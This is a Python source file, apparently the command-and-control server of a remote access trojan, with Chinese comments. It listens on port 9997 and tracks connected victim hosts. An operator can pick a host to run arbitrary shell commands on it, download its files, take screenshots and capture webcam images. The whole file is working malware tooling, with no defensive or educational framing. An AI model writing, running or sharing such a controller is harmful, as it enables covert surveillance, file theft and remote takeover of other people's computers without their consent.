import socket
import threading
import time
from PIL import Image


def accept():
    while True:
        client, addr = s.accept()
        host_list[addr[0]] = client


def offine():
    ip = []
    while True:
        if len(host_list) == 0:
            time.sleep(20)
            continue
        for i in host_list.items():
            client = i[1]
            try:
                client.sendall(bytes('hello', 'utf-8'))
            except:
                print('%s  offine......' % i[0])
                ip.append(i[0])
        for x in ip:
            del host_list[x]
        time.sleep(30)


def f_data(client_1, cmd):  # 取回文件处理
    client_1.sendall(bytes(cmd, 'utf-8'))
    f_name = cmd.split()[1]
    f = open(f_name, 'wb')
    while True:
        data = client_1.recv(8000)
        if data == b'stop':
            break
        f.write(data)
    print('%s  下载完成！' % f_name)
    f.close()


def ImageGrab(client_1, cmd):  # 远程截图处理
    client_1.sendall(bytes(cmd, 'utf-8'))
    x = b''
    while True:
        data = client_1.recv(8000)
        # print(data)
        if data == b'stop':
            break
        x = x + data
    im = Image.frombytes(mode='RGB', size=(1024, 768), data=x)
    im.show()


def CamImage(client_1, cmd):
    client_1.sendall(bytes(cmd, 'utf-8'))
    x = b''
    while True:
        data = client_1.recv(8000)
        # print(data)
        if data == b'stop':
            break
        x = x + data
    im = Image.frombytes(mode='RGB', size=(320, 240), data=x)
    im.show()


def cmd_start(client_1, cmd, ip):
    try:
        client_1.sendall(bytes(cmd, 'utf-8'))
        data = client_1.recv(8000)

        print(str(data, 'utf-8'))
    except:
        print('执行命令失败！')
        return 1

if __name__ == '__main__':
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    host_port = ('', 9997)
    s.bind(host_port)

    s.listen(10)
    host_list = {}
    t1 = threading.Thread(target=accept)
    t2 = threading.Thread(target=offine)
    t1.start()
    t2.start()
    while True:
        ip = input('ip::').strip()
        if ip == 'ls' and len(host_list) != 0:
            for i in host_list.items():
                print(i[0])
        elif ip in host_list.keys():  # 如果用户输入的ip地址属于主机列表，就发送接收cmd命令！
            while True:
                client_1 = host_list[ip]
                cmd = input('cmd:')
                if cmd == 'exit':
                    break

                elif cmd == '':
                    continue

                elif cmd.split()[0] == 'get':   # 文件取回
                    f_data(client_1, cmd)
                    continue
                elif cmd == 'ImageGrab':  # 屏幕截图
                    ImageGrab(client_1, cmd)
                    continue
                elif cmd == 'CamImage':
                    CamImage(client_1, cmd)
                    continue
                else:
                    if cmd_start(client_1, cmd, ip) == 1:
                        break  # cmd
        else:
            continue  # 跳到循环开头检查主机上线
